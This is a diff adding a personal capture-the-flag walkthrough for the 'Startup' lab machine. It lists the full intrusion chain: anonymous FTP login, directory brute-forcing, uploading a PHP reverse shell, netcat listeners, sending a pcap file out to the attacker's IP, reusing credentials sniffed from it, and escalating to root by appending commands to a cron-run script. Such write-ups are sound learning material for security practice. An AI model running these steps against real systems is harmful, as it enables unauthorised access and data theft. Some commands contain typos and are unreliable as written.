@@ -503,6 +503,110 @@ MR ROBOT CTF
 	>ls //usr.txt  //Found flag
 
 =================================================================================================
+#9 Startup
+ 
+	nmap scan-> found ftp(21) ssh(22), http(80) are open
+	Anonymous ftp login enabled- we can try for ftp login
+
+	>ftp IP address, user name=Aonymous, Password no need- Login success
+	>ascii   //before download files change to ascii mode so that we can see file content properly
+	ftp>ls -la
+	important.jpg
+	notice.txt
+	ftp (directory)
+
+	//download above files
+	ftp>get important.jpg notice.txt
+	
+	if downloaded files corrupted after downloaded using ascii mode switch back to binary mode (just ogin as usual w/o ascii
+	ftp>cat notice.txt  //found user name maya , and hint: download option is there
+
+	confirm webappication built with wappelyzer browser addon (to check aspx,php)
+	
+	visit webserver and view source //nothing useful found
+	
+	//brute force directories using gobuster
+	>gobuster dir -u IP address> -w <word list path>
+
+	after bdirectory traverse search  found /files
+	http://<IP addr>/files    //found same above files (asftre ftp login)
+
+	upload PHP reverse shell (from pentestmonkey site)
+	ftp> cd ftp  //ftp (directory) has rwX permission
+	ftp>put shell.php
+	
+	//start nc listener
+	>sudo nc -nvlp 1234
+	
+	http://<IP addr>/files   //and see shell.php file inside ftp folder, click on shell.php and see we got shell in netcat
+	
+	//stabilize shell
+	www-data@startup>python -C "import pty;pty.spawn('/bin/bash')"
+	www-data@startup>ls;pwd   //listed recipe.txt and incidents folder (has lowest privilize)
+	www-data@startup>cat recipe.txt  //ASCII text present
+	
+	www-data@startup>cd incidents
+	www-data@startup:/incidents>ls    //listed suspecious.pcapng
+
+	//open suspecious.pcapng with wireshark to check previous transaction , to find usefull info
+	
+	//tryto copy pcap file to /var/www/html/ftp
+	www-data@startup:/incidents>cp suspecious.pcapng /var/www/html/ftp   //permission denied
+
+	//check netcat installed on www-data@startup:/incidents>
+	www-data@startup:/incidents>which nc   // /bin/nc
+
+	//from other terminal start netcat listener- purpose is to copy suspecious.pcapng into our local machine
+	>nc -lvp 4444 > sus.pcap 
+	
+	www-data@startup:/incidents>nc 10.11.17.148 4444 (other terminal VM IP add is local machine)
+	
+	//received suspecious.pcapng , saved as sus.pcap
+	from local machine terminal
+	>ls -la   //listed susp.pcap
+	>wireshark susp.pcap   //to see content of file, filter http/tcp  transactions
+	tcp.port=4444    //found last user tried t loin with credentials
+	
+	www-data@startup:/incidents>cd /home
+	www-data@startup:/home>$ls -la   //listed lennie
+	www-data@startup:/home>$cd lennie   //permission denied
+	www-data@startup:/home>$su lennie  //enter password we got inside pcapng file
+	lennie@startup:/home>$id   //shows uid,gid etc
+        lennie@startup:/home>cd lennie
+	lennie@startup$ls   //listed Documents scripts user.txt
+	
+	//Documents directory has only jokes, nothing special
+	
+	 //cd into scripts folder
+	lennie@startup:-/scripts$ ls -la   //liste planner.sh (cron job, runs at particular period) & startup_list.txt
+
+	planner.sh has execute permission oly to root user	
+	lennie@startup:-/scripts$cat planner.sh   //see some code  which has /etc/print.sh  & echos environment variable 
+	
+	Note: we should not only concentrate on only script, also should see we can edit script, and see anyother sripts inside it, any library files we can make use to exploit
+		
+	//lets see we have execution permission for /etc/print.sh
+	lennie@startup:-/scripts$ ls -la /etc/print.sh   //yes lennie has execute permission, lennie is owner of this file
+
+	lennie@startup:-/scripts$cat /etc/print.sh  //see script what it doing
+
+	//copy all files under root directory into user lenie directory to make it execute with root permission
+	then change the file permission and append into /etc/print.sh file (which has required permission)
+
+	lennie@startup:-/scripts$echo "cp /root/+ /home/lennie; chmod 777 /home/lenie.*" >> /etc/print.sh
+
+	lennie@startup:-/scripts$cat /etc/print.sh  //see above content written 
+	
+	lennie@startup:-/scripts$cd /home/lennie
+
+	wait for a minute to crone job get executed, once executed
+	lennie@startup:-$ls -la  //root.txt file present (this file is copied from root user directory)
+
+	lennie@startup:-$file root.txt  //flag found
+
+=============================================================================
+
+
 
 
 
